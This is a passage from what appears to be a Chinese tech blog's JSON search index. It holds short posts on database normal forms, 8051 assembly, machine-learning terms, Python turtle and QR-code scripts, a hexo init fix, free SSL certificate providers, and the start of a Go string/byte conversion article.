即实体中的某个属性不能有多个值或者不能有重复的属性。如果关系中出现重复的属性，就需要定义一个新的实体，新的实体由重复的属性构成，新实体与原实体之间为一对多关系。在第一范式（1NF）中表的每一行只包含一个实例的信息。\n在任何一个关系数据库中，第一范式（1NF）是对关系模式的基本要求，不满足第一范式（1NF）的数据库就不是关系数据库\n在上表中，进货列与收获列有着相同的属性。这种情况就不符合数据库的 1NF ，应当将进货列与收获列进行拆分: 在新的两个实体集中，每一实体集都没有相同的属性，这样的表才符合第一范式。\n总结：\n第一范式即列不可分\n第二范式 属性完全依赖于主键 第二范式（1NF）是在第一范式的基础上建立起来的，即满足第二范式必须先满足第一范式。 第二范式要求数据库的每个实例或行必须可以被唯一的区分，即表中要有一列属性可以将实体完全区分，该属性即主键。\n每一个属性都应当完全依赖于主键\n在上表中，课程学分是不依赖于主键学号而是依赖于非主键列课程的，这样的表是不符合第二范式的。应当对其拆分： 拆分后的表，表中所有非主键列都完全依赖主键。不仅符合第二范式，还符合第三范式。 总结： 第二范式即非主属性必须依赖于主键的所有属性\n第三范式 每列都和主键列直接相关 满足第三范式必须先满足第二范式\n第三范式（2NF）要求一个数据库表中不包含已在其他表中已包含的非主关键字信息，即表中属性不依赖与其他非主属性。 在上表中，学号是主键，但是知道名字依然可以知道绩点。这样的表就是不符合第三范式，应当对表进行拆分： 对表进行拆分后，两个表中的属性列都依赖于主键学号。这样的表才是符合第三范式的。 总结：\n第三范式即每列都和主键列直接相关\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%89%E8%8C%83%E5%BC%8F/","title":"关系型数据库三范式"},{"content":"管理 Windows 启动项 使用 WIndows 官方提供的工具，Autoruns 即可进行管理：https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns\n官方下载链接：https://download.sysinternals.com/files/Autoruns.zip\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E7%AE%A1%E7%90%86-windows-%E5%90%AF%E5%8A%A8%E9%A1%B9/","title":"管理 Windows 启动项"},{"content":"汇编指令介绍 一、汇编指令分类 汇编指令总共有7种寻址方式，111条指令！\n字节数 单字节指令：49条 双字节指令：46条 三字节指令：16条 运算速度 单周期指令：65条 双周期指令：44条 四周期指令：2条 功能 数据传送类：29条 算术运算类：24条 逻辑运算类：24条 控制转移类：17条 位操作类：17条 二、汇编的指令格式 【标号：】 助记符 【操作数】 【；注释】\n**标号：**表示该指令的位置，相当于标记该指令在ROM中存储的位置； **助记符：**这是一条指令中必不可少的部分； **操作数：**可以有多个，或者没有，需要根据指令来确定； **注释：**用来解释所写的语句的含义，或者一些对程序的描述，可以根据需要来给出。 三、汇编指令种常用符号说明 **Rn：**工作寄存器中的寄存器 R0…R7 中之一 **Ri：**工作寄存器中的寄存器 R0 或 R1 **#data：**8位立即数 **#data16：**16位立即数 **direct：**片内RAM 或 SFR 的地址（8位） **@：**间接寻址寄存器 **Bit：**片内RAM 或 SFR 中可以位寻址的位地址 **addr11：**11位目的地址 **addr16：**16位目的地址 **Rel：**补码形式的8位地址偏移量 **$ ：**当前指令首字节所在地址 **X：**片内RAM的直接地址或寄存器 **(X)：**相应地址单元中的内容 **←：**箭头右边的内容送入箭头左边的单元内 **→：**箭头左边的内容送入箭头右边的单元内 四、数据传送类指令（29条） 指令助记符 MOV、MOVX、MOVC、XCH、XCHD、SWAP、PUSH、POP\n以累加器为目的操作数的指令（4条） 1 2 3 4 MOV A, Rn ;Rn→A MOV A, direct\t;(direct)→A MOV A, @Ri\t;(Ri)→A MOV A, #data\t;data→A 以寄存器Rn为目的操作数的指令 （3条） 1 2 3 MOV Rn, A\t;A →Rn\tMOV Rn, direct\t;(direct)→Rn MOV Rn, #data\t;data→Rn 以直接地址为目的操作数的指令（5条） 1 2 3 4 5 MOV direct, A\t;A→(direct) MOV direct, Rn\t;Rn→(direct) MOV direct1，direct2\tMOV direct, @Ri\t;(Ri) →(direct) MOV direct, #data ;data→(direct) 以间接地址为目的操作数的指令（3条） 1 2 3 MOV @Ri, A ;A →(Ri) MOV @Ri, direct\t;(direct) →(Ri) MOV @Ri, #data\t;data →(Ri) 十六位数的传递指令（1条） 1 MOV DPTR, #data16 8051是一种8位机，这是唯一的一条16位立即数传递指令。 **功能：**将一个16位的立即数送入 DPTR 中去。其中高8位送入 DPH，低8位送入 DPL。\n累加器A与片外RAM之间的数据传递类指令(4条) 1 2 3 4 MOVX A, @Ri MOVX @Ri, A MOVX A, @DPTR MOVX @DPTR, A ​\t在51中，与外部存储器RAM打交道的只可以是A累加器。所有需要送入外部RAM的数据必需要通过A送去，而所有要读入的外部RAM中的数据也必需通过A读入。 ​\t在此我们可以看出内外部RAM的区别了，内部RAM间可以直接进行数据的传递，而外部则不行。\n读程序存储器指令（2条） 1 2 MOVC A, @A+DPTR MOVC A, @A+PC 本组指令是将ROM中的数送入A中。本组指令也被称为查表指令，常用此指令来查一个已做好在ROM中的表格。**说明：**查找到的结果被放在A中，因此，本条指令执行前后，A中的值是不相同的。\n堆栈操作（2条） 1 2 PUSH direct ;SP ← SP+1，(SP) ← (direct) POP direct ;(direct) ← (SP), SP←SP-1 第一条为压入指令，就是将direct中的内容送入堆栈中； 第二条为弹出指令，就是将堆栈中的内容送回到direct中。\n交换指令（5条） 1 2 3 4 5 XCH A， Rn\t;A←→Rn XCH A， direct ;A←→(direct) XCH A， @Ri\t;A←→(Ri) XCHD A， @Ri\t;A.3～A.0←→(Ri).3～(Ri).0 SWAP A\t;A.3～A.0←→A.7～A.4 五、算术运算类指令(24条) 助记符 ADD、ADDC、INC、SUBB、DEC、DA、MUL、DIV\n加法指令 1.不带进位位的加法指令（4条） 1 2 3 4 ADD A，#data ;A＋data→A ADD A，direct ;A＋(direct )→A ADD A，Rn ;A＋Rn→A ADD A，@Ri ;A＋(Ri)→A 2.带进位位的加法指令（4条） 带进位位的加法指令常用于多字节的加法指令中\n1 2 3 4 ADDC A，Rn\t;A＋Rn＋CY→A ADDC A，direct\t;A＋(direct )＋CY→A ADDC A，@Ri\t;A＋(Ri)＋CY→A ADDC A，#data\t;A＋data＋CY→A 3. 加1指令（5条） 1 2 3 4 5 INC A\t;A+1→A，影响P标志 INC Rn\t;Rn+1→Rn INC direct\t;(direct)+1→(direct) INC @Ri\t;((Ri))+1→((Ri)) INC DPTR\t;DPTR+1→DPTR 4. 十进制调整指令（1条） 在进行BCD码加法运算时，跟在ADD和ADDC指令之后，用来对BCD码加法运算结果进行自动修正。\n1 DA A 例：A = 0001 0101 BCD（代表十进制数15）\n1 2 ADD A，#8\t;执行完之后，A = 1DH DA A\t;调整后，A = 23H 减法指令 1.带借位的减法指令（4条） 1 2 3 4 SUBB A，Rn\t;A－Rn－CY→A SUBB A，direct ;A－(direct )－CY→A SUBB A，@Ri\t;A－(Ri)－CY→A SUBB A，#data\t;A－data－CY→A 2. 减1指令（4条） 1 2 3 4 DEC A\t;A-1→A,影响P标志 DEC Rn\t;Rn-1→Rn DEC direct\t;(direct)-1→(direct) DEC @Ri\t;(Rn)-1→(Rn) 乘法指令 1 MUL AB ;A×B → BA 此指令的功能是将A和B中的两个8位无符号数相乘，两数相乘结果一般比较大，因此最终结果用1个16位数来表达，其中高8位放在B中，低8位放在A中。 在乘积大于FFH时，0V置1，否则OV为0；而CY总是0。\n除法指令 1 DIV AB ;A÷B 商→A 余数→B 此此指令的功能是将A中的8位无符号数除B中的8位无符号数（A/B）。除了以后，商放在A中，余数放在B中。 CY和OV都是0。如果在做除法前B中的值是00H，也就是除数为0，那么0V=1。\n逻辑运算类指令(24条) 逻辑或指令（6条） 1 2 3 4 5 6 ORL A，Rn ;A | Rn→A ORL A，direct ;A |(direct)→ A ORL A，@Ri ;A |(Ri)→A ORL A，#data\t;A | data→A ORL direct，A\t;(direct) | A→(direct) ORL direct，#data ;(direct) | data→(direct) 逻辑与指令（6条） 1 2 3 4 5 6 ANL A，Rn ;A \u0026amp; Rn→A ANL A，direct ;A \u0026amp;(direct)→ A ANL A，@Ri ;A \u0026amp;(Ri)→A ANL A，#data\t;A \u0026amp; data→A ANL direct，A\t;(direct) \u0026amp; A→(direct) ANL direct，#data ;(direct) \u0026amp; data→(direct) 逻辑异或指令（6条） 1 2 3 4 5 6 XRL A，Rn ;A ⊕ Rn→A XRL A，direct ;A ⊕(direct)→ A XRL A，@Ri ;A ⊕(Ri)→A XRL A，#data\t;A ⊕ data→A XRL direct，A\t;(direct) ⊕ A→(direct) XRL direct，#data ;(direct) ⊕ data→(direct) 清零与取反指令（2条） 1 2 3 4 5 清零指令 CLR A ; #0 → A 取反指令 CPL A\t; /A → A 循环移位指令（4条） 1 2 3 4 RL A ; 向左移位 RR A\t; 向右移位 RLC A\t; 向左带进位移位 RRC A\t; 向右带进位移位 控制转移类指令(24条) 共有控制程序转移类指令(不包括位操作类的转移指令)。此类指令一般不影响 PSW。\n包括以下类型：\n无条件转移和条件转移 相对转移和绝对转移 长转移和短转移 调用与返回指令 无条件转移类指令（4条） 短转移类指令： AJMP addr11 长转移类指令： LJMP addr16 相对转移指令： SJMP rel 间接转移指令： JMP @A+DPTR 上面的前三条指令，统统理解成： PC值改变，即跳转到一个标号处\nJMP指令之间的区别：\n跳转的范围不同 AJMP\taddr11 2K LJMP\taddr16\t64K SJMP rel\t-128 ~ 127 指令构成不同 AJMP、LJMP后跟的是绝对地址，而SJMP后跟的是相对地址。 指令长度不同 原则上LJMP可以代替AJMP和SJMP。 间接转移 JMP @A+DPTR 指令 用途也是跳转，转移地址由A+DPTR形成，并直接送入PC。 指令对A、DPTR和标志位均无影响。 本指令可代替众多的判别跳转指令，又称为散转指令，多用于多分支程序结构中。 该指令类似于C语言中的 switch（）{case：…}语句的功能。\n条件转移类指令（8条） 条件转移指令是指在满足一定条件时进行相对转移，否则程序继续执行本指令的下一条指令。\n判断A的值转移指令（2条） 1 2 JZ rel ;如果A=0，则转移，否则顺序执行。 JNZ rel ;如果A≠0，就转移。 转移到相对于当前PC值的8位移量的地址去。即： 新的PC值=当前PC+偏移量rel\n我们在编写汇编语言源程序时，可以直接写成： JZ 标号\t；即转移到标号处。\n比较不相等转移指令（4条） 1 2 3 4 CJNE A， #data， rel CJNE A， direct, rel CJNE Rn， #data， rel CJNE @Ri， #data， rel 此类指令的功能是将两个操作数比较，如果两者相等，就顺序执行，如果不相等，就转移。 同样地，使用时，我们可以将rel理解成标号。\n减1条件转移指令（2条） 1 2 DJNZ Rn， rel DJNZ direct， rel DJNZ指令的执行过程: 它将第一个参数中的值减1，然后看这个值是否等于0，如果等于0，就往下执行，如果不等于0，就转移到第二个参数所指定的地方去。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E8%A7%A3%E6%9E%90/","title":"汇编指令解析"},{"content":"归纳了一些在机器学习中经常遇到的专有名词 特征： 模型的输入 样本： 用于训练流程的输入/输出对 标签： 模型的输出 层级： 神经网络中相互连接的节点集合。 模型： 神经网络的表示法 密集全连接层 (FC)： 一个层级中的每个节点都与上个层级中的每个节点相连。 权重和偏差： 模型的内部变量 损失： 期望输出和真实输出之间的差值 MSE： 均方误差，一种损失函数，它会将一小部分很大的差值视作比大量很小的差值更糟糕 梯度下降法： 每次小幅调整内部变量，从而逐渐降低损失函数的算法 优化器： 梯度下降法的一种具体实现方法（“Adam”优化器是 ADAptive with Momentum 的简称，并且被视为最佳优化器） 学习速率： 梯度下降过程中的损失改进“步长” 批次： 在训练神经网络的过程中使用的一组样本。 周期： 完全经过整个训练数据集一轮 前向传播： 根据输入计算输出值 反向传播： 根据优化器算法计算内部变量的调整幅度，从输出层级开始，并往回计算每个层级，直到抵达输入层 训练集： 用于训练神经网络的数据。 测试集： 用于测试神经网络最终效果的数据 回归： 输出一个值的模型。例如，估算房屋价值。 分类： 一种模型，能够输出多个类别的概率分布。例如在 Fashion MNIST 模型中，输出是 10 个概率，每种服饰对应一个概率。我们在最后的密集层中使用 Softmax 激活函数创建了这个概率分布。 CNN： 卷积神经网络。即至少有一个卷积层的网络。典型的 CNN 还包括其他类型的层级，例如池化层和密集层 卷积： 向图像应用核（滤波器）的过程 核/滤波器： 小于输入的矩阵，用于将输入变成多个小区域 填充： 在输入图像周围添加像素，像素值通常为 0 池化： 通过下采样降低图像大小的过程。池化层有多种类型。例如，平均池化通过求平均值将多个值变成一个值。但是最大池化是最常见的池化类型。 最大池化： 一种池化过程，通过获取多个值中的最大值，将多个值变成一个值。 步长： 在图像上滑动核（滤波器）的间隔像素数量。 下采样： 降低图像大小的操作 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%93%E6%9C%89%E5%90%8D%E8%AF%8D%E5%BD%92%E7%BA%B3/","title":"机器学习专有名词归纳"},{"content":"监测 Windows 应用行为 当我们安装、运行 Windows程序时，程序可能会包含创建文件夹、修改注册表等一系列行为。但是大部分应用程序的这些行为对于使用者来说都是不可见的。\n当我们需要监控一个应用程序干了哪些事情，就可以使用工具： Wise Installation System。该应用程序通过拍摄快照、对比快照的方式可以来展示程序的行为。\n安装：\n选择SetupCapture： 勾选设置： 对当前主机内容拍摄快照： 执行需要观测的程序： 执行操作后再观测当前主机状态： 完成后就可以在此处看到这个过程中主机更改的信息了： ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E7%9B%91%E6%B5%8B-windows-%E5%BA%94%E7%94%A8%E8%A1%8C%E4%B8%BA/","title":"监测 Windows 应用行为"},{"content":"Linux 网络栈 本章节是对 Linux 内核网络栈源码的阅读，Linux 内核版本为 5.15 ，源码下载地址：https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/linux-5.15.15.tar.gz\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E7%AE%80%E4%BB%8B/","title":"简介"},{"content":"解决 hexo init 失败问题 问题描述 准备使用 hexo 搭建个人博客，执行 hexo init 后失败，错误内容为：\nA:\\桌面\\hexo\u0026gt;hexo init try-hard.cn INFO Cloning hexo-starter https://github.com/hexojs/hexo-starter.git error: RPC failed; curl 28 OpenSSL SSL_read: Connection was reset, errno 10054 fatal: expected flush after ref listing WARN git clone failed. Copying data instead FATAL { err: [Error: ENOENT: no such file or directory, scandir \u0026#39;C:\\Users\\Blogger\\AppData\\Roaming\\npm\\node_modules\\hexo-cli\\assets\u0026#39;] { errno: -4058, code: \u0026#39;ENOENT\u0026#39;, syscall: \u0026#39;scandir\u0026#39;, path: \u0026#39;C:\\\\Users\\\\Blogger\\\\AppData\\\\Roaming\\\\npm\\\\node_modules\\\\hexo-cli\\\\assets\u0026#39; } } Something\u0026#39;s wrong. Maybe you can find the solution here: %s http://hexo.io/docs/troubleshooting.html 根据错误，大概率是因为 GitHub 被墙导致网络连接失败。\n网上搜索了一下，大家的解决办法大多都是挂梯子，对于我这种没有梯子的人来说就有点绝望了。。。\n解决办法：替换 GitHub 链接 对于国内无法正常克隆 GitHub 仓库，可以通过替换 GitHub 链接来解决。不知道的朋友可以参看我的这篇博文：[[GitHub 克隆加速]]\n那么我们只要替换掉 hexo 的 GitHub 链接就可以正常运行 hexo 了。\n经过查找，发现 hexo 的 npm 模块在 Windows 环境下是在这个路径下：C:\\Users\\Blogger\\AppData\\Roaming\\npm\\node_modules\\hexo-cli\\lib\\console\n在这个文件夹下有一个 init.js 文件，打开文件\n1 2 3 4 将 const GIT_REPO_URL = \u0026#39;https://github.com/hexojs/hexo-starter.git\u0026#39;; 替换为： const GIT_REPO_URL = \u0026#39;https://github.com.cnpmjs.org/hexojs/hexo-starter.git\u0026#39;; 再次运行 hexo init ，成功！\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%A7%A3%E5%86%B3-hexo-init-%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/","title":"解决 hexo init 失败问题"},{"content":"解决 \u0026ldquo;make: warning: Clock skew detected. Your build may be incomplete.\u0026rdquo; 问题 执行 make 命令时出现make: warning: Clock skew detected. Your build may be incomplete.。\n这是由于不同设备系统之间的时间上存在差距，make 命令检测到时钟偏差。\n解决方案：\n1 find ./ -type f |xargs touch 将所有文件都重新touch一遍，更新到本地系统的时间，再make就没问题了。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E8%A7%A3%E5%86%B3-make-warning-clock-skew-detected.-your-build-may-be-incomplete.-%E9%97%AE%E9%A2%98/","title":"解决 make warning Clock skew detected. Your build may be incomplete. 问题"},{"content":"利用Python制作有趣的二维码 一、效果图 二、程序分析 近年来二维码已经在我们的生活中普及，并且在日常生活中扮演着重要角色。大家在日常生活中见到的二维码都是怎样的呢？我相信大家看到的大部分都是黑白的，今天我就来教大家怎样用Python来制作属于我们自己的二维码！ 我们今天制作二维码用到的是一个第三方库：myqr 我们在这里通过pip的方法安装这个库，打开我们的命令提示符窗口，输入:pip install myqr然后回车就可以进行库的安装了（注意pip的方法需要连接网络）。 在我们的Python代码第一行依然是导入库：\n1 from MyQR import myqr 然后就要开始写我们的代码了，myqr这个库里面只有一个函数：myqr.run() 在里面传递不同的参数就可以实现不同的功能，下面这段代码就会生成一个黑白的二维码，扫描二维码就会出现“Life is short I use Python!”的字样(注意！这个库只能接收英文字符）：\n1 myqr.run(words=\u0026#34;Life is short I use Python!\u0026#34;) 三、源代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from MyQR import myqr myqr.run(words=\u0026#34;Life is short I use Python!\u0026#34;) \u0026#39;\u0026#39;\u0026#39; 其他参数及其作用: 名字\t功能 传递值 words 二维码包含的内容 str version 边长 int（1~40） level 纠错等级 str(L,M,Q,H) picture 结合图片地址 str colorized 颜色 True为彩色 contrast 对比度 float(1.0代表原始图片) brightness 亮度 float(1.0代表原始值) save_name 输出名字 str(默认\u0026#34;qrcode.jpg\u0026#34;) save_dir 输出路径 str(默认在当前路径) \u0026#39;\u0026#39;\u0026#39; 今天的代码分析就到这里了，小伙伴们快去试一下吧！\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E5%88%A9%E7%94%A8-python-%E5%88%B6%E4%BD%9C%E6%9C%89%E8%B6%A3%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/","title":"利用 Python 制作有趣的二维码"},{"content":"利用Python绘制图案——螺旋丸 一、效果图 二、程序分析 本次程序我们依然是使用turtle库进行绘制的，因此在我们的程序第一行就是加载我们Python的turtle库了，不了解的同学可以参看我的[[利用Python绘制图案——玫色与雅]]。 接下来就是对我们的程序进行分析了，观察我们的效果图，发现本次的程序和上一次的程序有着一个相同之处——螺旋。上次我们绘制了螺旋的正方形，我们这一次绘制螺旋的正七边形，那么绘制正七边形的程序和上一次绘制正方形的程序就是大同小异了：\n1 2 3 4 for i in range(300): turtle.forward(i) turtle.left(360/7+1) turtle.done() 螺旋的正七边形我们已经绘制完毕，下一步就是给我们的正七边形进行上色了。改变画笔颜色我们这里将要用到turtle的内置函数：turtle.pencolor()，给这个函数传递一个颜色名字，我们的画笔颜色就会发生改变。\n1 2 3 4 5 6 # 直接传递颜色名字 turtle.pencolor(\u0026#39;red\u0026#39;) turtle.pencolor(\u0026#39;#33cc8c\u0026#39;) # RGB模式首先要改变模式再传递RGB值 turtle.colormode(255) turtle.pencolor(255,25,25) 我们本次程序使用的颜色有：\u0026lsquo;red\u0026rsquo;,\u0026lsquo;orange\u0026rsquo;,\u0026lsquo;yellow\u0026rsquo;,\u0026lsquo;green\u0026rsquo;,\u0026lsquo;cyan\u0026rsquo;,\u0026lsquo;blue\u0026rsquo;,\u0026lsquo;purple\u0026rsquo; 然后将我们的颜色添加进列表里面：\n1 colors = [\u0026#39;red\u0026#39;,\u0026#39;orange\u0026#39;,\u0026#39;yellow\u0026#39;,\u0026#39;green\u0026#39;,\u0026#39;cyan\u0026#39;,\u0026#39;blue\u0026#39;,\u0026#39;purple\u0026#39;] 接下来我们让每一次画一条边的时候都改变一次颜色，把pencolor添加进循环，这样每一次循环就改变一次颜色：\n1 2 3 4 5 6 colors = [\u0026#39;red\u0026#39;,\u0026#39;orange\u0026#39;,\u0026#39;yellow\u0026#39;,\u0026#39;green\u0026#39;,\u0026#39;cyan\u0026#39;,\u0026#39;blue\u0026#39;,\u0026#39;purple\u0026#39;] for x in range(300): turtle.pencolor(colors[x%len(colors)]) turtle.forward(x) turtle.left(360/len(colors)+1) turtle.done() 大家这个时候可能会发现我们的画作颜色太不显眼了，而且每一条边的宽度都是一个样样的，一点都不够炫酷啊！我们通过下面的方式来解决这两个问题。 首先解决对比度的问题，要么我们就一个一个为花朵找颜色，找到对比度强的颜色。另一种解决方式就是更换画布，也就是背景，既然白色太显眼了，那我们就用黑色，这下对比度应该就高了吧。改变画布颜色我们使用turtle.bgcolor()函数，使用方法和改变画笔颜色类似，来将我们的画布换成黑色的：\n1 turtle.bgcolor(\u0026#39;black\u0026#39;) 下一个问题是改变画笔的宽度，这一次我们需要使用turtle.pensize()这个函数，为它传递一个数字就能改变画笔的宽度：\n1 2 3 4 5 for x in range(300): turtle.forward(x) turtle.left(360/7+1) pen.width(x*0.03) # 这个比例是我自己试的 # 大家可以尝试其他比例找到自己最欢的 三、源代码 1 2 3 4 5 6 7 8 9 10 import turtle turtle.bgcolor(\u0026#39;black\u0026#39;) colors = [\u0026#39;red\u0026#39;,\u0026#39;orange\u0026#39;,\u0026#39;yellow\u0026#39;,\u0026#39;green\u0026#39;,\u0026#39;cyan\u0026#39;,\u0026#39;blue\u0026#39;,\u0026#39;purple\u0026#39;] turtle.speed(10) for x in range(300): turtle.pencolor(colors[x%len(colors)]) turtle.forward(x) turtle.left(360/len(colors)+1) turtle.width(x*0.03) turtle.done() 今天的代码分析就到这里了，小伙伴们快去试一下吧！\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E5%88%A9%E7%94%A8python%E7%BB%98%E5%88%B6%E5%9B%BE%E6%A1%88%E8%9E%BA%E6%97%8B%E4%B8%B8/","title":"利用Python绘制图案——螺旋丸"},{"content":"利用Python绘制图案——玫色与雅 一、效果图 二、程序分析 在介绍代码之前我们先简单介绍一下turtle库。 turtle库是Python的基础绘图库（官方手册），turtle库是Python标准库之一，不需要自己再另外安装。turtle库被介绍为一个最常用的用来给孩子们介绍编程知识的方法库，其主要是用于程序设计入门，利用turtle可以制作很多复杂的绘图。好了，turtle库的介绍到此为止，接下来开始分析我们的程序： 因为这个程序将会用到turtle库，因此我们先在程序的开头加载turtle库：\n1 import turtle 仔细观察图形，我们可以发现这是由许许多多逐渐变大的正方形，每个正方形偏转一定的角度叠加而成。 通过简单的分析，我们的程序实现需要完成两个两个部分，第一就是绘制不断变大的正方形，第二就是使正方形偏转一定角度。 首先绘制正方形，这里我们用到turtle库的内置函数:turtle.forward()，这个函数的功能是向当前画笔方向移动distance像素长度。我们利用这个函数来画正方形的边。每画完一条边画笔就旋转90度，这样循环四次就完成了一个正方形的绘制了，我们利用turtle.left()使画笔向左旋转90度（向右旋转用turtle.right()）。那我们先来绘制一个边长为100像素的正方形：\n1 2 3 for i in range(4): turtle.forward(100) turtle.left(90) 运行代码后大家可能会发现，正方形是画出来了，但是程序运行完了，窗口它自己就关闭了，根本没有停留啊！别慌，在上面程序的最后再添加一行turtle.done()，就可以不让窗口自动关闭了。 一个正方形我们已经可以绘制了，接下来我们需要让正方形不断变大，且不断旋转，变大我们利用range()函数，每画一条边，画下一条边的时候就变长一点：\n1 2 3 4 for i in range(200): turtle.forward(i) turtle.left(90) turtle.done() 这样我们这个逐渐变大的正方形就已经完成（其实上面这个图形也挺好看的(●ˇ∀ˇ●)），下一步我们就要让正方形不断旋转。我们每一次在正方形直角边进行转折的时候我们不转90度，我们转折91度，这样便可以实现整个正方形的旋转了（准确来说已经不叫正方形了）。将上面的的分析综合起来，我们的程序就完成了：\n1 2 3 4 for i in range(300): turtle.forward(i) turtle.left(91) turtle.done() 再给大家介绍一个十分强大的函数：exec() exec()函数可以动态执行python代码，简单来说可以在这个函数里面执行Python程序，具体用法可以参看exec()函数官方文档。 下面我们就将我们的代码添加进exec()函数：\n1 exec(\u0026#34;\u0026#34;\u0026#34;import turtle\\nfor i in range(300): \\n turtle.forward(i)\\n turtle.left(91)\\nturtle.done()\\n\u0026#34;\u0026#34;\u0026#34;) 三、源代码 普通模式\n1 2 3 4 5 import turtle for i in range(300): turtle.forward(i) turtle.left(91) turtle.done() 装13模式\n1 exec(\u0026#34;\u0026#34;\u0026#34;import turtle\\nfor i in range(300): \\n turtle.forward(i)\\n turtle.left(91)\\nturtle.done()\\n\u0026#34;\u0026#34;\u0026#34;) 今天的代码分析就到这里了，小伙伴们快去试一下吧！\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E5%88%A9%E7%94%A8python%E7%BB%98%E5%88%B6%E5%9B%BE%E6%A1%88%E7%8E%AB%E8%89%B2%E4%B8%8E%E9%9B%85/","title":"利用Python绘制图案——玫色与雅"},{"content":"免费 SSL 证书申请 Let\u0026rsquo;s Encrypt Let’s Encrypt 是一家免费、开放、自动化的证书颁发机构（CA），为公众的利益而运行。 它是一项由 Internet Security Research Group (ISRG) 提供的服务。\n由于 Let’s Encrypt 使用 ACME 协议来验证给定域名的控制权并向颁发证书。因此要获得 Let’s Encrypt 证书，就需要选择一个 ACME 客户端软件进行申请： ACME 客户端 - Let\u0026rsquo;s Encrypt - 免费的SSL/TLS证书 (letsencrypt.org)。\n能力描述 支持情况 是否需要登录 × 单域名证书 √ 多域名证书 √ 泛域名证书 √ 证书有效期 90 天 Email 验证 × HTTP 验证 √ DNS 验证 √ 证书数量限制 接近于无：https://letsencrypt.org/zh-cn/docs/rate-limits/ 注意：在国内使用 Let’s Encrypt 加密证书时，可能会遇到 OSCP 问题：Problem with OSCP timeout flag - Help - Let\u0026rsquo;s Encrypt Community Support (letsencrypt.org)\nZeroSSL ZeroSSL 支持 Web 界面管理证书，并同时提供了 RESTful 和 ACME接口。\n能力描述 支持情况 是否需要登录 √ 单域名证书 √ 多域名证书 × 泛域名证书 × 证书有效期 90 天 Email 验证 √ HTTP 验证 √ DNS 验证 √ 证书数量限制 3 FreeSSL FreeSSL 支持 Web 界面管理证书，并同时提供了 RESTful 和 ACME接口。\n能力描述 支持情况 是否需要登录 √ 单域名证书 √ 多域名证书 × 泛域名证书 × 证书有效期 90 天 Email 验证 √ HTTP 验证 √ DNS 验证 √ 证书数量限制 无 CloudFlare CloudFlare 源证书是免费的，但是仅对 Cloudflare 与源服务器之间的加密有效，源证书有效期 15 年。通用证书需要付费。\n华为云 华为云 支持 Web 界面管理证书，并提供了 RESTful 接口。\n能力描述 支持情况 是否需要登录 √ 单域名证书 √ 多域名证书 × 泛域名证书 × 证书有效期 1 年 Email 验证 × HTTP 验证 × DNS 验证 √ 证书数量限制 20 JoySSL JoySSL 仅支持 Web 界面管理证书。\n能力描述 支持情况 是否需要登录 √ 单域名证书 √ 多域名证书 √ 泛域名证书 √ 证书有效期 90 天 Email 验证 × HTTP 验证 √ DNS 验证 √ 证书数量限制 无 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E5%85%8D%E8%B4%B9-ssl-%E8%AF%81%E4%B9%A6%E7%94%B3%E8%AF%B7/","title":"免费 SSL 证书申请"},{"content":" \u003c!DOCTYPE html\u003e 你真的懂string与[]byte的转换了吗 你真的懂string与[]byte的转换了吗 机器铃砍菜刀 Go语言中文网 2020-10-05 20:10 发表于 string类型和[]byte类型是我们编程时最常使用到的数据结构。本文将探讨两者之间的转换方式，通过分析它们之间的内在联系来拨开迷雾。两种转换方式\n标准转换\ngo中string与[]byte的互换，相信每一位gopher都能立刻想到以下的转换方式，我们将之称为标准转换。1//\u0026nbsp;string\u0026nbsp;to\u0026nbsp;[]byte2s1\u0026nbsp;:=\u0026nbsp;\"hello\"3b\u0026nbsp;:=\u0026nbsp;[]byte(s1)45//\u0026nbsp;[]byte\u0026nbsp;to\u0026nbsp;string6s2\u0026nbsp;:=\u0026nbsp;string(b)强转换\n通过unsafe和reflect包，可以实现另外一种转换方式，我们将之称为强转换（也常常被人称作黑魔法）。 1func\u0026nbsp;String2Bytes(s\u0026nbsp;string)\u0026nbsp;[]byte\u0026nbsp;{ 2\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;sh\u0026nbsp;:=\u0026nbsp;(*reflect.StringHeader)(unsafe.Pointer(\u0026amp;s)) 3\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;bh\u0026nbsp;:=\u0026nbsp;reflect.SliceHeader{ 4\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;Data:\u0026nbsp;sh.Data, 5\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;Len:\u0026nbsp;\u0026nbsp;sh.Len, 6\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;Cap:\u0026nbsp;\u0026nbsp;sh.Len, 7\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;} 8\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;return\u0026nbsp;*(*[]byte)(unsafe.Pointer(\u0026amp;bh)) 